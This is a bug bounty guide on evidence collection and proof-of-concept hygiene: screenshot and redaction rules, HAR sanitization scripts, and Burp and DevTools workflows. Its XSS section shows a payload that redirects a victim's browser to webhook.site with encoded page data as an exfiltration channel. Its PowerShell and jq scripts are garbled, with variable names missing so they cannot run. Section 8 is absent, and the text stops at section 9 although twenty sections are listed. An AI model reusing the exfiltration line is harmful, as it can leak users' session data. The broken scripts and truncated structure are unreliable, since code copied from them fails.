# Evidence Collection & PoC Hygiene

> Quality of evidence is the single biggest factor determining bug bounty payout.
> Poor evidence = closed as "won't fix" or "insufficient detail".
> Good evidence = fast triage, higher severity, full bounty.
> This document codifies everything about collecting, formatting, redacting, and presenting evidence.

---

## Table of Contents

1. [EVIDENCE DISCIPLINE](#1-evidence-discipline)
2. [SCREENSHOT STANDARDS](#2-screenshot-standards)
3. [COOKIE REDACTION PROTOCOL](#3-cookie-redaction-protocol)
4. [PII BLACK-BAR DISCIPLINE](#4-pii-black-bar-discipline)
5. [HAR FILE SANITIZATION](#5-har-file-sanitization)
6. [BURP EVIDENCE WORKFLOW](#6-burp-evidence-workflow)
7. [CHROME DEVTOOLS EVIDENCE](#7-chrome-devtools-evidence)
8. [CLI/CURL EVIDENCE](#8-clicurl-evidence)
9. [SCREENSHOT CAPTURE ORDER](#9-screenshot-capture-order)
10. [FILENAME CONVENTIONS](#10-filename-conventions)
11. [VIDEO EVIDENCE](#11-video-evidence)
12. [EVIDENCE PACKAGE STRUCTURE](#12-evidence-package-structure)
13. [POST-SUBMISSION EVIDENCE HYGIENE](#13-post-submission-evidence-hygiene)
14. [PLATFORM-SPECIFIC EVIDENCE RULES](#14-platform-specific-evidence-rules)
15. [BURP EVIDENCE SANITIZATION](#15-burp-evidence-sanitization)
16. [CURL EVIDENCE SCRIPTS](#16-curl-evidence-scripts)
17. [EVIDENCE FOR OOB FINDINGS](#17-evidence-for-oob-findings)
18. [EVIDENCE FOR AUTH BYPASS](#18-evidence-for-auth-bypass)
19. [EVIDENCE VALIDATION CHECKLIST](#19-evidence-validation-checklist)
20. [COMMON EVIDENCE MISTAKES](#20-common-evidence-mistakes)

---

## 1. EVIDENCE DISCIPLINE

### 1.1 Why Evidence Quality Matters

Bug bounty triagers review 50-200 reports per day. Your evidence is the difference between
your report being taken seriously or being closed in 30 seconds. A triager should be able
to understand the vulnerability, reproduce it, and assess its impact from the screenshots
alone — without reading a single word of text.

### 1.2 The Evidence Quality Spectrum

Excellent:  Clear screenshots with red annotations, redacted PII, full request/response
            traces, clear impact demonstration, reproduction steps from screenshots alone

Good:       Clean screenshots, some annotations, cookies partially redacted, impact shown
            but may need text explanation

Adequate:   Screenshots exist but cluttered, some PII visible, impact unclear without
            significant text explanation

Poor:       Blurry screenshots, no annotations, full cookie values exposed, impact not
            demonstrated at all, triager must reproduce blind

Fatal:      No screenshots, broken image links, screenshots of text instead of the actual
            tool, session expired — nothing is reproducible

### 1.3 Core Principles

1. Assume the triager is in a hurry — make every screenshot tell the full story
2. Redact everything you don't want public — reports can become public after resolution
3. Never blur — blur is reversible with deconvolution algorithms (Wiener filter, etc.)
4. Use black rectangles only — 100% opacity, no transparency, no gradients
5. One finding per evidence package — never mix evidence for different bugs
6. Timestamp everything — screenshots should show the request/response timing
7. Show the whole chain — don't skip steps; each screenshot should logically follow the last
8. Verify reproducibility — if you can't reproduce it twice, don't submit evidence yet
9. Rotate everything after submission — cookies, sessions, test accounts
10. Keep originals — save unredacted originals locally in case the triager asks for more detail

### 1.4 What Makes Evidence "Strong"

| Criterion | Strong Evidence | Weak Evidence |
|-----------|----------------|---------------|
| Reproducibility | Step-by-step screenshots anyone can follow | "Just do a POST to /api/endpoint" |
| Impact clarity | Before/after comparison showing data access | Claiming impact without showing it |
| Redaction quality | Clean black bars, no data leakage | Blurry blobs, partial text visible |
| Context | URL bar visible, relevant headers shown | Cropped screenshot with no URL |
| Chain completeness | Every request/response pair shown | Only the final response shown |
| Timing | Response time visible for timing attacks | No timing data at all |

### 1.5 The Evidence Check

Before submitting any report, ask yourself:
- Can a triager reproduce this bug with ONLY the evidence provided?
- Is every piece of PII and sensitive data properly redacted with black bars?
- If this report becomes public, am I comfortable with every screenshot being visible?
- Does the evidence clearly show the security impact, not just the behavior?
- Is the evidence organized in a logical, step-by-step sequence?
- Have I removed test account credentials from all screenshots?

### 1.6 Evidence Is Part of the Attack Surface

Your evidence package becomes part of the program's security documentation. Poor evidence can:
- Get the program to ignore valid vulnerabilities
- Waste triager time on reproduction instead of assessment
- Reduce your credibility for future submissions
- Delay bounty payment while triager asks for clarification

Invest the time to make evidence excellent. It pays off.

### 1.7 Organization Level

- Every finding gets its own directory: findings/<finding-type>-<target>-<date>/
- Screenshots are numbered sequentially with descriptive names
- A README.md in each finding directory explains the evidence
- Raw (unredacted) copies go in a _raw/ subdirectory never submitted
- Redacted copies go in the root of the finding directory

### 1.8 Tool-Specific Evidence Logging

Maintain an evidence log for each hunting session using the session logging function.

--- EV LOG END SECTION 1 ---

--- EV LOG END SECTION 1 ---

## 2. SCREENSHOT STANDARDS

### 2.1 Resolution and Display Settings

- Recommended resolution: 1920x1080 (1080p)
- Minimum acceptable: 1280x720 (720p)
- Maximum: 2560x1440 (may be too large for platform upload)
- DPI: 96 DPI (standard), avoid Retina/HiDPI displays (produces giant images)
- Scaling: 100% in OS display settings — no fractional scaling
- Browser zoom: 100% — do not zoom in or out
- Font size: Default system font size

### 2.2 Screenshot Tools

| Tool | Platform | Notes |
|------|----------|-------|
| ShareX | Windows | Best overall — auto-upload, region capture, annotation |
| Flameshot | Linux | Open-source, good annotation tools |
| Greenshot | Windows | Lightweight, good for quick captures |
| Snip & Sketch | Windows | Built-in, basic annotations |
| macOS Screenshot | macOS | Cmd+Shift+4, built-in markup |
| Burp built-in | Cross-platform | Saves full request/response pairs |

### 2.3 Annotation Rules

#### Black Bars (REDACTION)

Black bars should cover sensitive data with 100% opacity black rectangles.
- Use 100% opacity black rectangles
- Rectangle should completely cover the sensitive data plus 2-3 pixels margin
- Do not use semi-transparent, blur, pixelate, or gradient effects
- Ensure the black bar itself has no subtle patterns or gradients
- If a black bar would hide critical context (e.g., proving a value IS a session token),
  redact only the value portion, keeping the parameter name visible

#### Red Rectangles (HIGHLIGHTING)

- Use bright red (#FF0000) with 30-40% opacity rectangles
- Draw rectangles around the key finding elements
- Use arrows to connect red rectangles to explanatory text if needed
- Do not over-annotate — one or two key highlights per screenshot maximum

#### Text Annotations

- Use numbered steps (1, 2, 3) for sequences
- Arrows to show flow
- Brief text labels (max 5-7 words)
- Font: Arial or sans-serif, size 14-16pt
- Color: White text on dark background, black text on light
- Place annotations in margins, not over content

### 2.4 What the Screenshot Must Include

Every screenshot must contain:
1. The URL bar — shows the full URL including protocol, domain, path, and query params
2. The browser/tool chrome — shows what tool is being used (Burp, browser, terminal)
3. Relevant request context — method, headers, body (if important)
4. The response — status code, headers, body showing the vulnerability
5. Timing information — for timing-based attacks, show the response time
6. Date/time indicator — browser clock, Burp timestamp, or system clock

### 2.5 What to Crop Out

- Bookmarks bars
- Browser extensions (unless relevant)
- Other tabs/windows
- Desktop background/wallpaper
- Personal files/folders in explorer
- Other application windows
- System tray notifications
- Personal bookmarks
- Browsing history in URL dropdown
- Other open applications

### 2.6 Burp Panel Hiding Rules

When capturing Burp evidence:
1. Hide the Alerts panel — can show internal IPs, other test targets
2. Hide the Scope settings — reveals what else is in scope
3. Collapse the Target tree — shows other hosts you've tested
4. Only show the relevant tab — Repeater, Intruder, or Proxy as needed
5. Hide the Dashboard — shows scan queue, other issues found
6. Close irrelevant tabs — other requests in Repeater/Intruder
7. Check the Proxy history filter — ensure you're only showing the target host

### 2.7 Browser Console in Screenshots

For XSS evidence:
- Show the console with the executed payload
- Include the URL bar showing the page with the XSS
- Show the alert(document.domain) or console.log(document.cookie) output
- Ensure the console is large enough to read
- Split screenshot: top half shows the page, bottom half shows console

### 2.8 Screenshot Quality Checklist

- Resolution is 1920x1080 or close to it
- No blur effects used anywhere
- All black bars are 100% opacity
- Red annotations are at 30-40% opacity
- URL is visible and shows the full path
- No personal information visible
- No credential values visible
- No internal IPs or hostnames visible
- The vulnerability is obvious from the screenshot alone
- Timing/session context is visible
- Burp alerts/scope/target tree are hidden

--- EV LOG END SECTION 2 ---

--- EV LOG END SECTION 2 ---

## 3. COOKIE REDACTION PROTOCOL

### 3.1 What Cookies Must Be Redacted

| Cookie Field | Redact? | Reason |
|-------------|---------|--------|
| name | No | Identifies which cookie it is |
| value | YES | Session identifier, token, secret |
| domain | No | Shows the scope of the cookie |
| path | No | Shows the path restriction |
| expires | No | Shows session duration (useful for fixed sessions) |
| Secure flag | No | Security indicator |
| HttpOnly flag | No | Security indicator |
| SameSite flag | No | Security indicator — important for CSRF context |

### 3.2 Cookie Redaction Format

WRONG (exposed):
  Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMjM0NTY3ODkwfQ.signature

WRONG (blur):
  Cookie: session=...... (blurred — reversible)

WRONG (partial):
  Cookie: session=eyJhbGciOiJIUzI1NiIs... (truncated signature visible)

CORRECT:
  Cookie: session=[REDACTED]

CORRECT (when multiple cookies):
  Cookie: session=[REDACTED]; csrf_token=[REDACTED]

### 3.3 Session Cookie Redaction After Use

After you finish testing with a session:
1. Immediately rotate the session cookie (log out, log back in)
2. Close all browser tabs that have the session
3. Clear browser cookies for the target domain
4. Invalidate the old session if possible via logout API
5. Capture new session for any follow-up evidence

### 3.4 Burp Cookie Redaction Workflow

#### Method 1: Preview Tab Annotation (Recommended)
1. Send the request to Repeater
2. Click the Preview tab (not Raw) in the response viewer
3. The Preview tab renders HTML and hides the raw response
4. Take screenshot from Preview view — cookies in request are not visible
5. If you must show the request, switch to Raw and use external annotation

#### Method 2: Raw Tab + External Redaction
1. Switch to Raw tab to show the full request
2. Take screenshot
3. Open in image editor (ShareX, GIMP, Paint.NET)
4. Draw black rectangles over cookie values
5. Save as PNG (never JPEG for screenshots with text)

#### Method 3: Burp Structural Modification (for HAR/export)
Before exporting, use Burp Search and Replace in Proxy options:
- Add a replacement rule: Cookie: (.*) -> Cookie: [REDACTED]
- This modifies the request display before export
- Remember to disable the rule after export

### 3.5 DevTools Cookie Redaction

Application > Storage > Cookies > https://target.com

  Name           Value                    Domain       Path   Expires
  -------------------------------------------------------------------------
  session        [REDACTED]               target.com   /      2026-06-07
  csrf_token     [REDACTED]               target.com   /      2026-06-07
  user_prefs     dark_mode               target.com   /      2026-12-31

- Redact the Value column, NOT the Name column
- Redact the Value column even if it is a JWT that looks safe — decode it first
- Double-check the Domain column for cookie scope issues (useful evidence)
- The Expires column is safe to show — helps demonstrate session duration

### 3.6 Cookie Redaction in Curl/CLI Evidence

WRONG — exposes cookie value:
  curl -v -b "session=eyJhbGciOiJIUzI1NiJ9.payload.signature" https://target.com/admin

CORRECT — use variable and redact output:
  curl -v -b "session=" https://target.com/admin 2>&1 | sed 's/session=[^;]*/session=[REDACTED]/g'

CORRECT — redact after capture:
  curl -v -b "session=" https://target.com/admin > output.txt 2>&1
  Then manually redact the Cookie line in output.txt

### 3.7 Cookie Redaction Verification Checklist

- All Cookie: header values are fully redacted in request screenshots
- All Set-Cookie: header values are fully redacted in response screenshots
- No partial cookie values visible (truncated JWTs, first/last 4 chars)
- Cookie names are left visible (they don't compromise security)
- Document.cookie output in XSS evidence is redacted
- Application > Storage > Cookies browser view is redacted
- Curl -b parameter values are redacted from terminal output
- Postman/API client cookie values are redacted
- No cookies visible in URL fragments (uncommon but check)
- HAR files have Cookie/Set-Cookie headers stripped

--- EV LOG END SECTION 3 ---

--- EV LOG END SECTION 3 ---

## 4. PII BLACK-BAR DISCIPLINE

### 4.1 What MUST Be Redacted (Always)

| PII Type | Example | Redaction Method |
|----------|---------|------------------|
| Real full names | John Smith | Black bar over the name |
| Email addresses | john@example.com | Black bar over the email |
| Phone numbers | +1 (555) 123-4567 | Black bar over the number |
| Physical addresses | 123 Main St, City, State ZIP | Black bar over the address |
| Government IDs | SSN: 123-45-6789 | Black bar over the ID number |
| Passport numbers | AB1234567 | Black bar over the number |
| Credit card numbers | 4111-1111-1111-1111 | Black bar over the number |
| Face images | Profile photos, selfies | Black bar over the face area |
| License plates | ABC-1234 | Black bar over the plate |
| Biometric data | Fingerprints, face scans | Black bar over the data |
| Health information | Any medical data | Black bar over the data |
| Financial account numbers | Bank account numbers | Black bar over the number |
| IP addresses (internal) | 10.0.0.5, 192.168.1.1 | Black bar over the IP |
| API keys/secrets | sk-... or AKIA... | Black bar over the key |

### 4.2 What Is SAFE to Leave Visible

| Data Type | Safe? | Rationale |
|-----------|-------|-----------|
| Usernames | YES | Usually public or pseudonymous |
| User IDs (numeric) | YES* | Unless PII-identifying (sequential + small pool) |
| Order IDs | YES* | Unless PII-identifying (order reveals buyer identity) |
| Session token names | YES | session=, token= — just redact the value |
| Trace IDs | YES | Request tracing, not personally identifying |
| Request IDs | YES | Server-side tracking, not PII |
| Transaction IDs | YES | Usually opaque identifiers |
| Timestamps | YES | Timing evidence is often critical |
| HTTP status codes | YES | Not PII |
| Endpoint paths | YES | Part of the bug evidence |
| Error messages | YES* | Unless they contain PII (names, emails) |
| Stack traces | YES* | Unless they contain internal paths with usernames |
| Browser user-agent | YES | Standard header, not PII |
| Content-Type headers | YES | Standard header, not PII |
| Host headers | YES | The target domain itself |
| Referer headers | YES* | Unless they contain PII in the URL |

### 4.3 Edge Cases — When User IDs Become PII

User IDs are USUALLY safe, BUT:
- If the user pool is small (e.g., 50 employees) and IDs are sequential (1-50),
  an ID + timestamp could identify a specific person
- If the application shows real names next to user IDs elsewhere,
  redact the ID to prevent cross-referencing
- If the user ID is an email address (e.g., john.smith@company.com),
  REDACT IT — it is an email, not an ID
- If the user ID is a UUID, it is generally safe (not guessable, not sequential)

When in doubt: REDACT. You can always provide the raw ID if the triager asks.

### 4.4 Redaction Dimensions

Black bar guidelines:
- Minimum width: Cover the text + 3px on each side
- Height: Cover the full text height + 2px top and bottom
- Color: #000000 (pure black), 100% opacity
- Shape: Rectangle only — no circles, ovals, or irregular shapes
- Position: Exact overlay on the text — no gaps, no overshoot beyond 5px

Example of proper email redaction:
  "email": "[REDACTED]"

Example of WRONG email redaction (partial):
  "email": "john[REDACTED]" <- First name still visible

### 4.5 Multi-Instance Redaction

When the same PII appears in multiple places, redact EVERY occurrence.

Response body:
  {
    "user": {
      "name": "[REDACTED]",          <- Redacted
      "email": "[REDACTED]",          <- Redacted
      "profile": {
        "name": "[REDACTED]",         <- Redacted again (same value)
        "contact": {
          "email": "[REDACTED]"       <- Redacted again
        }
      }
    }
  }

### 4.6 Structural Redaction (JSON Responses)

For JSON responses, redact the VALUE, not the KEY:

CORRECT:
  {"user_name": "[REDACTED]", "user_email": "[REDACTED]"}

WRONG:
  {"user_name": "REDACTEDVALUE", "user_email": "REDACTEDVALUE"}
  (Now the triager doesn't know what the redacted fields are)

### 4.7 PII in URLs

URL parameters can contain PII:

  https://target.com/profile?email=john@example.com&name=John+Smith
                                        REDACT            REDACT

If the entire URL appears in a browser address bar, redact the parameter values:
  https://target.com/profile?email=[REDACTED]&name=[REDACTED]

### 4.8 PII in Error Messages

Error messages often leak PII. Redact carefully:

ORIGINAL:
  Error: User 'john.smith@acmecorp.com' not found in group 'Engineering'

REDACTED:
  Error: User '[REDACTED]' not found in group 'Engineering'

### 4.9 Face and Image Redaction

For profile photos, avatars, or user images:
- Black bar covering the face area
- Rectangle, not oval
- Cover the entire face + hair
- Use a single rectangle, not multiple small ones

### 4.10 PII Redaction Verification Checklist

- Every screenshot scanned for email addresses
- Every screenshot scanned for phone numbers
- No real names visible anywhere
- No government ID numbers visible
- No credit card numbers or financial data visible
- No face images visible without black bars
- No physical addresses visible
- No internal IP addresses visible
- Error messages double-checked for embedded PII
- URL parameters scanned for PII
- JSON keys intact, values redacted (not vice versa)
- All PII redacted consistently across all evidence files

--- EV LOG END SECTION 4 ---

--- EV LOG END SECTION 4 ---

## 5. HAR FILE SANITIZATION

### 5.1 What Is a HAR File

HAR (HTTP Archive) files contain the full request and response data for every HTTP
transaction captured by browser DevTools, proxy tools, or intercepting proxies.
They include headers, cookies, POST bodies, and response content.

HAR files are EXTREMELY dangerous to share raw — they contain everything.

### 5.2 Critical HAR Headers to Remove

| Header | Why Remove | When Keep |
|--------|-----------|-----------|
| Cookie | Session tokens, auth | Never — always redact |
| Set-Cookie | Session tokens issued | Never — always redact |
| Authorization | Bearer tokens, Basic auth | Never — always redact |
| X-API-Key | API authentication | Never — always redact |
| X-Auth-Token | Auth tokens | Never — always redact |
| Proxy-Authorization | Proxy credentials | Never — always redact |
| WWW-Authenticate | May leak realm/NTLM info | Usually redact |
| X-CSRF-Token | Anti-CSRF tokens | Usually redact |
| X-XSRF-TOKEN | Anti-CSRF tokens | Usually redact |

### 5.3 jq-Based HAR Sanitization

Strip Cookie, Set-Cookie, and Authorization headers from all entries:

`ash
jq '.log.entries[] |= (
  .request.headers = [
    .request.headers[] | select(
      .name | test("^[Cc]ookie$"; "i") | not
    )
  ] |
  .request.cookies = [] |
  .response.headers = [
    .response.headers[] | select(
      .name | test("^[Ss]et-[Cc]ookie$"; "i") | not
    )
  ] |
  .response.cookies = [] |
  .request.headers = [
    .request.headers[] | select(
      .name | test("^[Aa]uthorization$"; "i") | not
    )
  ]
)' capture.har > sanitized.har
`

### 5.4 Aggressive HAR Sanitization (jq)

`ash
jq '
  def sensitiveHeaders: [
    "^[Cc]ookie$",
    "^[Ss]et-[Cc]ookie$",
    "^[Aa]uthorization$",
    "^[Xx]-[Aa][Pp][Ii]-[Kk]ey$",
    "^[Xx]-[Aa]uth-[Tt]oken$",
    "^[Xx]-[Cc][Ss][Rr][Ff]-[Tt]oken$",
    "^[Xx]-[Xx][Ss][Rr][Ff]-[Tt]oken$",
    "^[Pp]roxy-[Aa]uthorization$",
    "^[Ww][Ww][Ww]-[Aa]uthenticate$"
  ];
  .log.entries[] |= (
    .request.headers = [
      .request.headers[] | select(
        .name as  | sensitiveHeaders | any( | test(.; "i")) | not
      )
    ] |
    .request.cookies = [] |
    .response.headers = [
      .response.headers[] | select(
        .name as  | sensitiveHeaders | any( | test(.; "i")) | not
      )
    ] |
    .response.cookies = [] |
    .request.postData.text |= (
      if . then gsub("password=[^&]*"; "password=[REDACTED]") else . end
    ) |
    .request.postData.text |= (
      if . then gsub("token=[^&]*"; "token=[REDACTED]") else . end
    ) |
    .request.postData.text |= (
      if . then gsub("secret=[^&]*"; "secret=[REDACTED]") else . end
    )
  )
' ""
`

### 5.5 PowerShell HAR Redaction Script

`powershell
param(
    [Parameter(Mandatory=True)]
    [string],
    [Parameter(Mandatory=True)]
    [string]
)

function Remove-SensitiveHeaders {
    param()
     = @(
        '^Cookie$', '^Set-Cookie$', '^Authorization$',
        '^X-API-Key$', '^X-Auth-Token$', '^X-CSRF-Token$',
        '^X-XSRF-TOKEN$', '^Proxy-Authorization$'
    )
    return  | Where-Object {
         = .name
        -not ( | Where-Object {  -match  })
    }
}

function Remove-SensitivePostData {
    param()
    if (-not ) { return  }
     =  -replace 'password=[^&]*', 'password=[REDACTED]'
     =  -replace 'token=[^&]*', 'token=[REDACTED]'
     =  -replace '"password"\s*:\s*"[^"]*"', '"password":"[REDACTED]"'
     =  -replace '"token"\s*:\s*"[^"]*"', '"token":"[REDACTED]"'
     =  -replace '"secret"\s*:\s*"[^"]*"', '"secret":"[REDACTED]"'
    return 
}

try {
     = Get-Content -Path  -Raw | ConvertFrom-Json
     = .log.entries.Count
    Write-Host "Processing  entries..."
    foreach ( in .log.entries) {
        .request.headers = Remove-SensitiveHeaders -headers .request.headers
        .request.cookies = @()
        .response.headers = Remove-SensitiveHeaders -headers .response.headers
        .response.cookies = @()
        if (.request.postData -and .request.postData.text) {
            .request.postData.text = Remove-SensitivePostData -text .request.postData.text
        }
    }
     | ConvertTo-Json -Depth 10 | Out-File -FilePath  -Encoding UTF8
    Write-Host "Sanitized HAR written to: "
} catch {
    Write-Error "Error processing HAR file: "
    exit 1
}
`

### 5.6 Regex Patterns for Credential Stripping

`
(?i)^cookie:\s.*$                              ->  Cookie: [REDACTED]
(?i)^set-cookie:\s.*$                          ->  Set-Cookie: [REDACTED]
(?i)^authorization:\s.*$                       ->  Authorization: [REDACTED]
(?i)^proxy-authorization:\s.*$                 ->  Proxy-Authorization: [REDACTED]
(?i)^x-api-key:\s.*$                           ->  X-API-Key: [REDACTED]
(?i)([&?])password=[^&\s]+                     ->  =[REDACTED]
(?i)([&?])token=[^&\s]+                        ->  =[REDACTED]
(?i)([&?])secret=[^&\s]+                       ->  =[REDACTED]
(?i)([&?])api_key=[^&\s]+                      ->  =[REDACTED]
(?i)([&?])client_secret=[^&\s]+                ->  =[REDACTED]
"(?i)password"\s*:\s*"[^"]*"                    ->  "password":"[REDACTED]"
"(?i)token"\s*:\s*"[^"]*"                       ->  "token":"[REDACTED]"
"(?i)secret"\s*:\s*"[^"]*"                      ->  "secret":"[REDACTED]"
"(?i)apiKey"\s*:\s*"[^"]*"                      ->  "apiKey":"[REDACTED]"
"(?i)access_token"\s*:\s*"[^"]*"               ->  "access_token":"[REDACTED]"
(?i)bearer\s+[a-zA-Z0-9_\-\.]+                ->  Bearer [REDACTED]
`

### 5.7 Quick HAR Sanitization One-Liner

`powershell
(Get-Content "capture.har" -Raw) -replace '"(Cookie|Set-Cookie|Authorization|X-API-Key)":\s*\{[^}]*\}', '"": "[REDACTED]"' | Set-Content "sanitized.har"
`

### 5.8 HAR File Validation After Sanitization

`powershell
param([Parameter(Mandatory=True)][string])

 = Get-Content  -Raw
 = @(
    'Cookie:\s+\S+',
    'Set-Cookie:\s+\S+',
    'Authorization:\s+\S+',
    'password=[^&]',
    'secret=[^&]'
)

 = False
foreach ( in ) {
     = [regex]::Matches(, , 'IgnoreCase')
    if (.Count -gt 0) {
        Write-Warning "Found 0 matches for pattern: "
         = True
    }
}
if (-not ) { Write-Host "HAR file appears clean." -ForegroundColor Green }
`

### 5.9 HAR Submission Notes

- Most platforms accept HAR files as supplementary evidence
- HackerOne: HAR can be attached to comments, not directly to reports
- Bugcrowd: HAR files accepted as attachments (max 25MB)
- Always compress HAR files (gzip) before uploading
- Never submit a raw HAR without sanitization
- Keep the original (unsanitized) HAR locally for your own records
- Compress with: gzip -k capture.har -> capture.har.gz

--- EV LOG END SECTION 5 ---

--- EV LOG END SECTION 5 ---

## 6. BURP EVIDENCE WORKFLOW

### 6.1 Burp Repeater Screenshots

SHOW the request body when:
- The payload is the exploit (XSS, SQLi, command injection)
- The body contains modified parameters (IDOR, mass assignment)
- The Content-Type or encoding is relevant
- The body shows authentication/authorization context

HIDE the request body when:
- It is a long payload that scrolls (truncate at 20 lines)
- The body is irrelevant to the finding (standard REST GET)
- The body contains unrelated data (automation artifacts)

Repeater Best Practices:
1. Always show the request number (#1, #2) — proves it is your crafted request
2. Keep Host header visible — confirms the target
3. Use the Raw tab for evidence — the Pretty tab may hide important details
4. Match the request/response pair — screenshot should show both halves
5. Include the response status code — 200 vs 403 vs 500 is critical evidence
6. Scroll the response — show the full response body or enough to prove impact
7. Resize panels — give more space to the side with more information

### 6.2 Burp Intruder Screenshots

Attack Evidence Layout:
  Intruder Attack [#1] — Positions
  Target: https://target.com/api/reset-password
  Payload position: email=[test@test.com]

  Results Table:
  #    Payload              Status   Length
  0    user@test.com        200      1452
  1    admin@test.com       200      1452
  2    user@exists.com      200      3421       <- Different length = user exists
  3    notfound@no.com      404      234        <- Different status = validation

Intruder Best Practices:
1. Show ONLY the Results table — hide the request/response panel for rate-limit attacks
2. Sort by Length — response length differences are often the key finding
3. Highlight anomalous results — use red annotations for rows that differ
4. Filter to relevant results — don't show all 1000 requests if only 5 are revealing
5. Remove the Positions tab from screenshot
6. Show the payload column — confirms which payloads produced which results
7. Include status codes — 200 vs 403 vs 404 differences are critical
8. Comment relevant rows — use the Intruder comment feature for annotation

## 6.3 Burp Proxy History Screenshots

Before taking a Proxy history screenshot:
1. Apply host filter — show only the target domain
2. Apply MIME filter — show only HTML, JSON, JavaScript, other text
3. Add comments — right-click > Add Comment to mark important requests
4. Highlight findings — use yellow/red highlights for key requests
5. Hide irrelevant — filter out CSS, images, fonts, binary data
6. Check the filter bar IS visible — proves you filtered properly

Filter settings:
  Filter by Request Type:
    Show only in-scope items
    Show only parameterized requests
  Filter by MIME Type:
    HTML, JSON, JavaScript checked
    CSS, Images, Other binary unchecked
  Filter by Status Code:
    2xx, 3xx, 4xx, 5xx all shown

### 6.4 Burp Logger for Long-Running Evidence

Burp Logger captures ALL traffic — useful for evidence during long tests.
But Logger captures ALL traffic — means ALL cookies, ALL tokens.
ALWAYS sanitize Logger exports before submitting.

Steps:
1. Open Logger tab
2. Apply same host/MIME filters as Proxy history
3. Select the relevant requests
4. Right-click > Copy to File
5. Run sanitization script on the exported file

### 6.5 Burp Comparison Tool Evidence

For race conditions, timing attacks, or before/after comparison:
- Show both sides of the Comparer equally
- Use red annotations on the difference
- Include the words/bytes comparison summary
- Show timestamps if comparing timing

### 6.6 Burp Evidence Checklist

- Repeater screenshot shows request number
- Host header is visible in request
- Response status code is visible
- Cookie values are redacted
- Request body is shown only when relevant
- Intruder Results table is filtered to relevant rows
- Intruder shows payload, status, and length columns
- Proxy history shows the filter bar
- Proxy history shows only target host
- Burp alerts/target tree/dashboard are hidden
- Comparator results show both sides equally
- Logger exports are sanitized
- No other target hosts visible in the history

--- EV LOG END SECTION 6 ---

--- EV LOG END SECTION 6 ---

## 7. CHROME DEVTOOLS EVIDENCE

### 7.1 Console PoC Patterns

For XSS, use the console to demonstrate impact without exposing cookies:

BAD — exposes cookies in screenshot:
  alert(document.cookie);

GOOD — shows cookies via console.log with label:
  console.log('XSS_EXECUTED: Target domain is', document.domain);
  console.log('XSS_EXECUTED: Cookies present:', document.cookie.length > 0);

BETTER — demonstrates impact without exposing values:
  fetch('/api/me').then(r => r.text()).then(t => {
    console.log('XSS_EXECUTED: API /me returned', t.length, 'bytes of user data');
  });

BEST — demonstrates data exfiltration channel without exfiltrating:
  document.location = 'https://webhook.site/test?x=' +
    btoa(JSON.stringify({domain: document.domain, cookieLen: document.cookie.length}));
  Then show the webhook.site request log (without the actual cookie value)

### 7.2 Network Tab Filtering

Network tab filter bar is critical for proof. Useful filter patterns:
  domain:target.com                    — Only show target host
  -domain:analytics.com                — Exclude analytics/telemetry
  status-code:200                      — Only successful requests
  status-code:403,401,500              — Show blocked/failed requests
  method:POST                          — Only POST requests
  larger-than:1k                       — Responses > 1KB
  mime-type:application/json           — Only JSON responses
  has-response-header:Set-Cookie       — Responses setting cookies

### 7.3 Sources Tab for JS Analysis

Use the Sources tab to show:
- The vulnerable function in JavaScript source
- The line where user input is used unsafely
- The code path that leads to the vulnerability
- Pretty-printed vs original source (both useful)

### 7.4 Application Tab for Storage Evidence

Application > Storage > Local Storage:
  Key                    Value
  auth_token             [REDACTED]
  user_prefs             {"theme":"dark"}
  session_data           [REDACTED]
  api_endpoint           https://api.target.com

Only redact sensitive values. API endpoints and non-sensitive prefs are safe.

### 7.5 DevTools Screenshot Best Practices

1. Use Full-size screenshot mode
2. Dock DevTools to bottom for vertical space
3. Undock DevTools for side-by-side views
4. Use Group by frame in Network tab for iframe analysis
5. Enable Preserve log so evidence persists across navigations
6. Disable cache for fresh requests
7. Clear the Console before capturing
8. Show timestamps in Console settings
9. Use verbose console: Show all messages

### 7.6 DevTools Evidence Checklist

- Console logs show labeled output (XSS_EXECUTED, AUTH_BYPASS, etc.)
- No raw cookie values logged to console
- Network tab filter bar is visible
- Network tab shows relevant requests only
- Preserve log is checked
- Application/Storage shows only relevant keys
- Sensitive storage values are redacted
- Sources tab shows the vulnerable code path
- Page URL is visible in the address bar
- Console timestamps are visible (if relevant)
- No extension icons/artifacts in the capture

--- EV LOG END SECTION 7 ---

--- EV LOG END SECTION 8 ---

## 9. SCREENSHOT CAPTURE ORDER

### 9.1 The Standard Five-Shot Sequence

For every finding, capture evidence in this standardized order:

Shot 1: SETUP      — Show login state, authentication context
Shot 2: REQUEST    — Show the malicious request being prepared
Shot 3: BEFORE     — Show the state before exploitation (comparison)
Shot 4: EXPLOIT    — Show the exploitation result
Shot 5: VERIFY     — Show confirmation (scope, fix, additional impact)

### 9.2 Shot 1: Setup (Login/Auth State)

Purpose: Prove you are authenticated as the right user (or unauthenticated).

What to show:
- The authenticated session (cookie exists, user is logged in)
- The user's identity (username, role, account type)
- The initial state before any manipulation
- If unauthenticated: show the login page or the not logged in state
- If testing privilege escalation: show the lower-privilege role explicitly

Example for IDOR (Alice accessing Bob's data):
  Alice's Dashboard
  Welcome back, alice_user
  Account ID: acct_12345
  Email: alice@test.com
  Role: Standard User

### 9.3 Shot 2: Request Preparation

Purpose: Show exactly what request is being sent and how it is crafted.

What to show:
- The full request (method, path, headers, body)
- The modified/interesting parameter highlighted in red
- Any custom headers or cookies used
- The tool being used (Burp Repeater number, curl command, etc.)
- If in Burp: show the Repeater tab number (#1, #2) for traceability

### 9.4 Shot 3: Before State (Comparison Baseline)

Purpose: Show what the normal state looks like — the baseline for comparison.

What to show:
- The legitimate/authorized view of the resource
- Proves the resource exists and would normally be restricted
- Establishes the comparison baseline for the exploit shot
- Shows the user's own data to contrast with accessed data

Example: Alice's Orders (Normal Access)
  Order ID: 12345 — Item: Widget A — Status: Shipped
  Order ID: 12346 — Item: Widget B — Status: Processing

### 9.5 Shot 4: Exploitation Result (Impact)

Purpose: Show the unauthorized/modified request succeeding.

What to show:
- The response returned (200 OK, not 403 Forbidden)
- The data that was accessed without authorization
- Clear indication this is another user's data (name, email, etc.)
- Red annotations highlighting the security-relevant data
- The URL or request identifier proving the manipulation

Example: Bob's Orders (Accessed via IDOR)
  Order ID: 98765 — Item: Premium Widget Z — Price: .99
  Customer: Bob Smith (bob@test.com)

### 9.6 Shot 5: Verification (Optional but Recommended)

Purpose: Confirm the finding is valid and in-scope.

What to show:
- The endpoint is in scope (scope policy screenshot)
- The vulnerability reproduces (repeat the exploit)
- If applicable: higher-privilege user wouldn't expect this access
